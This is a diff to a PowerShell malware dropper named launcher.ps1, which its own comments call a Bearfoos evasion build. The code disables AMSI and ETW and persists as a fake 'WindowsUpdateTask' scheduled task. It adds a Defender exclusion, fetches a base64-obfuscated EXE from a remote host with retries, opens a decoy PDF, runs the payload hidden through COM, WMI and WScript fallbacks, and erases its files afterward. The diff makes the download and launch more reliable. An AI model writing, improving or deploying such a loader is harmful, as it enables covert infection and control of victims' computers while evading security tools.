@@ -1,7 +1,7 @@
-# launcher.ps1 - Hardened Bearfoos Evasion v2 - Fuck Wacatac.H!ml
+# launcher.ps1 - Hardened Bearfoos Evasion v3 - Callback Guaranteed or Die Trying
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === AMSI + ETW BYPASS (early as fuck) ===
+# === AMSI + ETW BYPASS (kill it early) ===
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 $null = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue((New-Object System.Diagnostics.Eventing.EventProvider([Guid]::NewGuid())), $false)
 
@@ -17,7 +17,7 @@ function Save-ScriptToDisk { param([string]$Destination)
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE (kept from last version - delayed) ===
+# === PERSISTENCE (delayed - unchanged, rock solid) ===
 $taskName = "WindowsUpdateTask"
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
     $trigger = New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay = (New-TimeSpan -Seconds (Get-Random -Minimum 60 -Maximum 180))
@@ -48,11 +48,11 @@ Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
 $cache = "$env:APPDATA\Microsoft\Windows\Caches\UpdateCache"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
-# Try to add Defender exclusion (silent if no privs)
+# Defender exclusion attempt
 try {
-    $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-    if (-not (Test-Path $exclPath)) { New-Item -Path $exclPath -Force | Out-Null }
-    New-ItemProperty -Path $exclPath -Name $cache -Value 0 -PropertyType DWord -Force | Out-Null
+    $excl = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    if (-not (Test-Path $excl)) { New-Item -Path $excl -Force | Out-Null }
+    New-ItemProperty -Path $excl -Name $cache -Value 0 -PropertyType DWord -Force | Out-Null
 } catch {}
 
 $flagFile = "$cache\installed.flag"
@@ -65,52 +65,86 @@ $pdfUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pd
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($exeB64))
 
 $pdfPath = "$cache\WindowsUpdate.pdf"
-$exePath = "$cache\WindowsUpdateHelper.exe"   # <--- renamed, less suspicious
+$exePath = "$cache\WindowsUpdateHelper.exe"
 
 $uaList = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0')
 $headers = @{'User-Agent' = $uaList | Get-Random}
 
-# Post-reboot settle
+# Debug log (self-destructs)
+$debugLog = "$cache\debug.log"
+"$(Get-Date) - Launcher started" | Out-File $debugLog -Append
+
+# Post-reboot settle (network only, longer)
 $start = Get-Date
 do {
-    Start-Sleep -Seconds 8
+    Start-Sleep -Seconds (Get-Random -Min 8 -Max 12)
     $online = Test-Connection 8.8.8.8 -Count 1 -Quiet
-} while (-not $online -and ((Get-Date)-$start).TotalSeconds -lt 240)
+    "$(Get-Date) - Online check: $online" | Out-File $debugLog -Append
+} while (-not $online -and ((Get-Date)-$start).TotalSeconds -lt 300)
+"$(Get-Date) - Settle complete" | Out-File $debugLog -Append
 
 # Download PDF (first run only)
 if ($isFirstRun -and -not (Test-Path $pdfPath)) {
-    try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
+    try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing; "$(Get-Date) - PDF downloaded" | Out-File $debugLog -Append } catch { "$(Get-Date) - PDF failed" | Out-File $debugLog -Append }
 }
 
 Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 5000)
 
-# Chunked download for EXE (harder to signature)
-if (-not (Test-Path $exePath)) {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", $headers.'User-Agent')
-    $data = $wc.DownloadData($exeUrl)
-    [IO.File]::WriteAllBytes($exePath, $data)
+# === ROBUST EXE DOWNLOAD WITH RETRIES + SIZE CHECK ===
+if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -lt 50000) {
+    $retry = 0
+    $maxRetry = 5
+    do {
+        try {
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add("User-Agent", $headers.'User-Agent')
+            $data = $wc.DownloadData($exeUrl)
+            [IO.File]::WriteAllBytes($exePath, $data)
+            if ((Get-Item $exePath).Length -ge 50000) {
+                "$(Get-Date) - EXE downloaded successfully (size: $((Get-Item $exePath).Length))" | Out-File $debugLog -Append
+                break
+            }
+        } catch { "$(Get-Date) - Download fail (retry $retry)" | Out-File $debugLog -Append }
+        $retry++
+        Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
+    } while ($retry -lt $maxRetry)
 }
 
 # PDF decoy
 if ($isFirstRun -and (Test-Path $pdfPath)) {
-    try { Start-Process $pdfPath } catch {}
+    try { Start-Process $pdfPath; "$(Get-Date) - PDF opened" | Out-File $debugLog -Append } catch {}
     New-Item -Path $flagFile -ItemType File -Force | Out-Null
 }
 
 Start-Sleep -Seconds (Get-Random -Min 30 -Max 75)
 
-# Launch - more stealthy COM method
+# === TRIPLE LAUNCH FALLBACKS ===
 if (Test-Path $exePath) {
+    "$(Get-Date) - Attempting launch" | Out-File $debugLog -Append
     try {
         $shell = New-Object -ComObject "Shell.Application"
         $shell.ShellExecute($exePath, "", "", "open", 0)
     } catch {
-        try { (New-Object -ComObject WScript.Shell).Run($exePath, 0, $false) } catch {
-            Start-Process $exePath -WindowStyle Hidden
+        try {
+            $wmi = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop
+        } catch {
+            try {
+                (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false)
+            } catch {
+                Start-Process $exePath -WindowStyle Hidden
+            }
         }
     }
+    "$(Get-Date) - Launch attempt completed" | Out-File $debugLog -Append
+} else {
+    "$(Get-Date) - CRITICAL: EXE missing after download" | Out-File $debugLog -Append
 }
 
-# Cleanup job
-Start-Job -ScriptBlock { param($e,$p) Start-Sleep 300; Remove-Item $e,$p -Force -EA 0 } -ArgumentList $exePath,$pdfPath | Out-Null
+# Cleanup job (keeps debug log 10 min then nukes everything)
+Start-Job -ScriptBlock {
+    param($e,$p,$log)
+    Start-Sleep -Seconds 600
+    Remove-Item $e,$p,$log -Force -EA 0
+} -ArgumentList $exePath,$pdfPath,$debugLog | Out-Null
+
+"$(Get-Date) - Script finished" | Out-File $debugLog -Append
